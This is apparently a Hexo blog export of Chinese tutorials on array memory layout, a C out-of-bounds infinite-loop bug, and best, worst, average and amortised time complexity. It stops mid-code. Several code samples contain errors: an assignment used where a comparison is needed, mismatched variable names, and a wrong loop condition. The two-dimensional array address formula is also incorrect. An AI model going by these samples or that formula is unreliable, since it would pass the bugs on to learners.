src=\"/posts/2018-09-10-算法-数组/数组删除.jpg\">\n<p>为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。</p>\n<p>如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，<font color=\"red\"><strong>很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的</strong></font>。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"警惕数组越界问题\"><a href=\"#警惕数组越界问题\" class=\"headerlink\" title=\"警惕数组越界问题\"></a>警惕数组越界问题</h3></div><br></div><br>了解数组的几个基本操作后，再来看看数据的访问越界问题。</p>\n<p>这里以一段C语言代码为例来进行说明：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> arr[<span class=\"number\">3</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i; i&lt;=<span class=\"number\">3</span>; i++)&#123;</span><br><span class=\"line\">\t\tarr[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"hello world\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你发现问题了吗？这段代码并不是打印三行”hello world”，而是会无限打印”hello world”，这是为什么呢？</p>\n<p>我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i&lt;=3而非i&lt;3，所以当i=3时，数组访问越界。</p>\n<p>我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。</p>\n<p>关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: <a href=\"https://blog.csdn.net/liuhuiyi/article/details/7526889\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/liuhuiyi/article/details/7526889</a></p>\n<p>数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。</p>\n<p>所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。</p>\n<p>但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"容器能否完全代替数组\"><a href=\"#容器能否完全代替数组\" class=\"headerlink\" title=\"容器能否完全代替数组?\"></a>容器能否完全代替数组?</h3></div><br></div><br>针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？</p>\n<p>以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。</p>\n<p>不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。</p>\n<p>作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。</p>\n<p>1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。</p>\n<p>2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。</p>\n<p>对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。</p>\n<h4 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h4><p>为什么数组的索引是从0开始，而不是从1开始呢？</p>\n<p>从数组存储的内存模型来看，”下标”即索引最确切的定义应该是”偏移(offset)”，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可<br>$$ a[k]\\_address = base\\_address + k * type\\_size $$</p>\n<p>但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：<br>$$ a[k]\\_address = base\\_address + (k-1) * type\\_size $$</p>\n<p>对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。</p>\n<p>不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。</p>\n<p>C语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。</p>\n<h4 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h4><p>1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。<br>2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？</p>\n<hr>\n<h5 id=\"JVM标记清除垃圾回收算法：\"><a href=\"#JVM标记清除垃圾回收算法：\" class=\"headerlink\" title=\"JVM标记清除垃圾回收算法：\"></a>JVM标记清除垃圾回收算法：</h5><p>分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。</p>\n<p>该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。</p>\n<h5 id=\"二维数组的寻址公式：\"><a href=\"#二维数组的寻址公式：\" class=\"headerlink\" title=\"二维数组的寻址公式：\"></a>二维数组的寻址公式：</h5><img src=\"/posts/2018-09-10-算法-数组/二维数组.jpg\">\n<p>根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：<br>$$ arr[i][j]\\_address = base\\_address + (i + n*j)*data\\_type\\_size $$</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。</p>\n<p>是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。</p>\n<p>在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"数组如何实现随机访问？\"><a href=\"#数组如何实现随机访问？\" class=\"headerlink\" title=\"数组如何实现随机访问？\"></a>数组如何实现随机访问？</h3></div><br></div>\n\n<p>什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。</p>\n<p>这里有几个关键词：</p>\n<p>第一是<strong>线性表</strong>。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。</p>\n<p>与线性表相对应的概念是<strong>非线性表</strong>，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。</p>\n<p>第二个是<strong>连续的内存空间和相同类型的数据</strong>。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。</p>\n<p>说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？</p>\n<p>我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。</p>\n<img src=\"/posts/2018-09-10-算法-数组/数组.jpg\" title=\"数组\">\n<p>我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。</p>\n<div style=\"text-align: center;\"><br><blockquote class=\"blockquote-center\"><p>$$ a[i]\\_address = base\\_address + i * data\\_type\\_size $$</p>\n</blockquote><br></div>\n\n<p>其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。</p>\n<p>很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。<br>实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"低效的“插入”和“删除”\"><a href=\"#低效的“插入”和“删除”\" class=\"headerlink\" title=\"低效的“插入”和“删除”\"></a>低效的“插入”和“删除”</h3></div><br></div><br>前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？</p>\n<h4 id=\"插入操作\"><a href=\"#插入操作\" class=\"headerlink\" title=\"插入操作\"></a>插入操作</h4><p>假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。</p>\n<p>如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+…+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。</p>\n<p>如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。</p>\n<h4 id=\"删除操作\"><a href=\"#删除操作\" class=\"headerlink\" title=\"删除操作\"></a>删除操作</h4><p>跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。</p>\n<p>和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。</p>\n<p>实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？</p>\n<p>我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。</p>\n<img src=\"/posts/2018-09-10-算法-数组/数组删除.jpg\">\n<p>为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。</p>\n<p>如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，<font color=\"red\"><strong>很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的</strong></font>。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"警惕数组越界问题\"><a href=\"#警惕数组越界问题\" class=\"headerlink\" title=\"警惕数组越界问题\"></a>警惕数组越界问题</h3></div><br></div><br>了解数组的几个基本操作后，再来看看数据的访问越界问题。</p>\n<p>这里以一段C语言代码为例来进行说明：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> arr[<span class=\"number\">3</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i; i&lt;=<span class=\"number\">3</span>; i++)&#123;</span><br><span class=\"line\">\t\tarr[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"hello world\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你发现问题了吗？这段代码并不是打印三行”hello world”，而是会无限打印”hello world”，这是为什么呢？</p>\n<p>我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i&lt;=3而非i&lt;3，所以当i=3时，数组访问越界。</p>\n<p>我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。</p>\n<p>关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: <a href=\"https://blog.csdn.net/liuhuiyi/article/details/7526889\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/liuhuiyi/article/details/7526889</a></p>\n<p>数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。</p>\n<p>所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。</p>\n<p>但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"容器能否完全代替数组\"><a href=\"#容器能否完全代替数组\" class=\"headerlink\" title=\"容器能否完全代替数组?\"></a>容器能否完全代替数组?</h3></div><br></div><br>针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？</p>\n<p>以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。</p>\n<p>不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。</p>\n<p>作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。</p>\n<p>1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。</p>\n<p>2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。</p>\n<p>对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。</p>\n<h4 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h4><p>为什么数组的索引是从0开始，而不是从1开始呢？</p>\n<p>从数组存储的内存模型来看，”下标”即索引最确切的定义应该是”偏移(offset)”，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可<br>$$ a[k]\\_address = base\\_address + k * type\\_size $$</p>\n<p>但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：<br>$$ a[k]\\_address = base\\_address + (k-1) * type\\_size $$</p>\n<p>对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。</p>\n<p>不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。</p>\n<p>C语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。</p>\n<h4 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h4><p>1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。<br>2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？</p>\n<hr>\n<h5 id=\"JVM标记清除垃圾回收算法：\"><a href=\"#JVM标记清除垃圾回收算法：\" class=\"headerlink\" title=\"JVM标记清除垃圾回收算法：\"></a>JVM标记清除垃圾回收算法：</h5><p>分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。</p>\n<p>该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。</p>\n<h5 id=\"二维数组的寻址公式：\"><a href=\"#二维数组的寻址公式：\" class=\"headerlink\" title=\"二维数组的寻址公式：\"></a>二维数组的寻址公式：</h5><img src=\"/posts/2018-09-10-算法-数组/二维数组.jpg\">\n<p>根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：<br>$$ arr[i][j]\\_address = base\\_address + (i + n*j)*data\\_type\\_size $$</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-最好、最坏、平均、均摊时间复杂度","date":"2018-09-08T16:18:36.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。\n\n这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识：\n<font color=red>**最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度**</font>。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 最好、最坏时间复杂度\n{% endnote %}\n</div> \n\n我们先用学过的知识试着分析以下代码的时间复杂度：\n\n```C\nint findArray(int[] arr, int n, int target){\n  int i = 0;\n  int pos = -1;\n\n  for(i; i<n; i++){\n    if(arr[i] = target){\n      pos = i;\n    }\n  }\n  return pos;\n}\n```\n\n上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。\n\n但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码：\n\n```C\nint findArray(int[] arr, int n, int target){\n  int i = 0;\n  int pos = -1;\n\n  for(i; i<n; i++){\n    if(arr[i] = target){\n      pos = i;\n      break;\n    }\n  }\n  return pos;\n}\n```\n但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？\n\n因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。\n\n为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：**最好情况时间复杂度、最坏情况复杂度、平均时间复杂度**。\n\n顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。\n\n同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。\n<div style=\"text-align: center;\">\n{% note success %} \n### 平均时间复杂度\n{% endnote %}\n</div> \n我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：**平均情况时间复杂度，简称平均时间复杂度**。\n\n平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。\n\n要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即：\n\n$$ \\frac{1+2+3+...+n+n}{n+1} = \\frac{n(n + 3)}{2(n + 1)} $$\n\n我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。\n\n这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。\n\n我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\\frac{1}{2}$。\n\n不在数组中时，时间复杂度为: <font color=red>$n\\times\\frac{1}{2}$</font>; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:<font color=red>$\\frac{1}{2n}$</font>, 因此在数组中时的时间复杂度为：<font color=red>$(1+2+3+...+n)\\times\\frac{1}{2n} $</font>。\n\n\n那平均时间复杂度就是：<font color=red>$(1+2+3+...+n)\\times\\frac{1}{2n} + n\\times\\frac{1}{2} = \\frac{3n+1}{4} = O(n)$</font>。\n\n这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做**加权平均时间复杂度**或者**期望时间复杂度**。\n\n实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。\n<div style=\"text-align: center;\">\n{% note success %} \n### 均摊时间复杂度\n{% endnote %}\n</div> \n目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：**均摊时间复杂度**，以及它对应的分析方法**摊还分析**。\n\n均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。\n\n还是以一个例子来说明(别太在意例子，只是为了说明)：\n\n```C\nint[] arr = new int[n];\nint size = 0；\n\nvoid insert(int val){\n  // 如果数组满了\n  if(count == arr.length){\n    int sum = 0;\n    for(int i=0; i<arr.length;i++){\n      sum = sum + arr[i];\n    }\n    arr[0] = sum;\n    count = 1;\n  }\n  // 数组赋值\n  arr[count] = val;\n  ++count;\n}\n```\n先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。\n\n那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。\n\n最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +....+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。\n\n我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。\n\n针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：**摊还分析法**，通过摊还分析得到的时间复杂度我们起了一个名字叫：**摊还时间复杂度**。\n\n那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？\n\n我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。\n\n均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。\n\n对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。\n\n\n### 思考题：\n\n根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。\n\n```C\nint[] arr = new int[10];\nint len = 10;\nint i=0;\n\nvoid add(int element){\n  // 数组空间满了\n  if(i>=len){\n    // 数组扩容\n    int new_arr = new int[len*2];\n    // 把数组拷贝到新数组\n    for(int j=0; i<len; j++){\n      new_arr[j] = arr[j];\n    }\n    arr = new_arr;\n    len 